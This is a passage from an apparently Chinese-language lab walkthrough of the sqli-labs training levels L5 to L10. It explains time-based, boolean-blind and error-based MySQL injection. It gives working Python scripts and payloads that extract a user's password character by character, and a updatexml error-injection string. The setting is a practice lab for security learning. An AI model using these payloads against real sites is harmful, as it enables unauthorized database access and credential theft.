</code></pre></div></div></div><h4 class="x-h3">时间盲注</h4><p class="x-p">在页面回显内容完全没有差异的情况下，就需要用时间盲注。时间盲注利用下面的MySQL函数：</p><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p"><code class="x-inline-highlight">sleep(sec)</code>：让数据库休眠指定的秒数。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">SELECT</span> sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p"><code class="x-inline-highlight">if(cond, exp_true, exp_false)</code>：如果条件<code class="x-inline-highlight">cond</code>为真，则返回<code class="x-inline-highlight">exp_true</code>，否则返回<code class="x-inline-highlight">exp_false</code>。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">SELECT</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"Yes"</span><span class="token punctuation">,</span><span class="token string">"No"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">-- Yes</span>
<span class="token keyword">SELECT</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token operator">></span><span class="token number">45</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">-- 4</span>
</code></pre></div></div></div><div class="x-highlightblock highlight-background-golden"><p class="x-p">当发现服务端延迟时间远大于<code class="x-inline-highlight">sleep(...)</code>设置的延迟参数时，可能是在当前语法中<code class="x-inline-highlight">sleep</code>函数会对每一行数据都调用一次。例如：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">SELECT</span> id <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div></div><h4 class="x-h3">报错注入</h4><p class="x-p">如果服务端会将数据库报错信息返回给客户端，就可以利用报错信息进行注入，思路是让我们想要的查询结果作为报错信息的一部分返回。（此时盲注就不再是盲注了 ^v^）</p><p class="x-p">报错注入常用的MySQL函数有：</p><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p"><code class="x-inline-highlight">extractvalue(xml_string, xpath)</code>：该函数用于从XML文档中提取数据。如果<code class="x-inline-highlight">xpath</code>不合法，报错中会出现<code class="x-inline-highlight">xpath</code>的内容。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>extractvalue<span class="token punctuation">(</span><span class="token boolean">null</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'anything'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></div><p class="x-p">通常插入一个<code class="x-inline-highlight">~</code>（<code class="x-inline-highlight">0x7e</code>）分隔符，一方面方便定位报错信息，另一方面是使用Xpath不支持的字符确保稳定触发报错。</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p"><code class="x-inline-highlight">updatexml(xml_string, xpath, new_xml)</code></p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>updatexml<span class="token punctuation">(</span><span class="token boolean">null</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">'anything'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">)</span></code></pre></div></div></div><h3 class="x-h2">L5</h3><p class="x-p">以L5为例，思路是根据回显长度不同逐字符爆破出查询结果：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 120px, var(--bg-transparent-golden) 120px 168px, transparent 168px, transparent 264px, var(--bg-transparent-golden) 264px 360px, transparent 360px)"><code><span class="token keyword">from</span> query <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># target: SELECT password FROM security.users WHERE username='Angelina'</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-5"</span><span class="token punctuation">,</span> <span class="token string">"?id=1' AND 1=0 -- "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 720</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-5"</span><span class="token punctuation">,</span> <span class="token string">"?id=1' AND 1=1 -- "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 704</span>


<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),</span><span class="token interpolation"><span class="token punctuation">{</span>pos<span class="token punctuation">}</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string"> -- "</span></span>
        resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-5"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">704</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> i
    <span class="token keyword">return</span> <span class="token boolean">None</span>


password <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    ch <span class="token operator">=</span> brute_force<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> ch <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] found"</span><span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">)</span>
    password <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span>  <span class="token comment"># I-kill-you</span>
</code></pre></div><h3 class="x-h2">L6</h3><p class="x-p">其他几个如法炮制，只需要变一下判断条件和闭合方式：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-6"</span><span class="token punctuation">,</span> <span class="token string">'?id=1" AND 1=0 -- '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 720</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-6"</span><span class="token punctuation">,</span> <span class="token string">'?id=1" AND 1=1 -- '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 702</span>


<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'?id=1" AND ascii(substr((SELECT password FROM security.users WHERE username="Angelina"),</span><span class="token interpolation"><span class="token punctuation">{</span>pos<span class="token punctuation">}</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string"> -- '</span></span>
        resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-6"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">702</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> i
    <span class="token keyword">return</span> <span class="token boolean">None</span>
</code></pre></div><h3 class="x-h2">L7</h3><p class="x-p">L7刚好两种响应的长度是一样的，所以通过内容判断：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">HTML</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>#FFFF00<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>You have an error in your SQL syntax<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>#FFFF00<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>You are in.... Use outfile......<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span>
</code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"You are in"</span> <span class="token keyword">in</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-7"</span><span class="token punctuation">,</span> <span class="token string">"?id=1')) AND 1=0 -- "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>  <span class="token comment"># False</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"You are in"</span> <span class="token keyword">in</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-7"</span><span class="token punctuation">,</span> <span class="token string">"?id=1')) AND 1=1 -- "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>  <span class="token comment"># True</span>


<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1')) AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),</span><span class="token interpolation"><span class="token punctuation">{</span>pos<span class="token punctuation">}</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string"> -- "</span></span>
        resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-7"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"You are in"</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">return</span> i
    <span class="token keyword">return</span> <span class="token boolean">None</span>
</code></pre></div><h3 class="x-h2">L8</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-8"</span><span class="token punctuation">,</span> <span class="token string">"?id=1' AND 1=0 -- "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 722</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-8"</span><span class="token punctuation">,</span> <span class="token string">"?id=1' AND 1=1 -- "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 706</span>


<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),</span><span class="token interpolation"><span class="token punctuation">{</span>pos<span class="token punctuation">}</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string"> -- "</span></span>
        resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-8"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">706</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> i
    <span class="token keyword">return</span> <span class="token boolean">None</span>
</code></pre></div><h3 class="x-h2">L9</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-9"</span><span class="token punctuation">,</span> <span class="token string">"?id=1' AND 1=0 -- "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 744</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-9"</span><span class="token punctuation">,</span> <span class="token string">"?id=1' AND 1=1 -- "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 707</span>


<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),</span><span class="token interpolation"><span class="token punctuation">{</span>pos<span class="token punctuation">}</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string"> -- "</span></span>
        resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-9"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">707</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> i
    <span class="token keyword">return</span> <span class="token boolean">None</span>
</code></pre></div><h3 class="x-h2">L10</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-10"</span><span class="token punctuation">,</span> <span class="token string">'?id=1" AND 1=0 -- '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 746</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_get<span class="token punctuation">(</span><span class="token string">"Less-10"</span><span class="token punctuation">,</span> <span class="token string">'?id=1" AND 1=1 -- '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 709</span>


<span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'?id=1" AND ascii(substr((SELECT password FROM security.users WHERE username="Angelina"),</span><span class="token interpolation"><span class="token punctuation">{</span>pos<span class="token punctuation">}</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string"> -- '</span></span>
        resp <span class="token operator">=</span> query_get<span class="token punctuation">(</span><span class="token string">"Less-10"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">709</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> i
    <span class="token keyword">return</span> <span class="token boolean">None</span>
</code></pre></div><h3 class="x-h2">补充：L5-L6报错注入</h3><p class="x-p">L5和L6开启了报错回显，也可以使用报错注入，以L5为例：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?id=1' OR updatexml(null,concat(0x7e,(SELECT password FROM security.users WHERE username='Angelina'),0x7e),null) -- "</span>
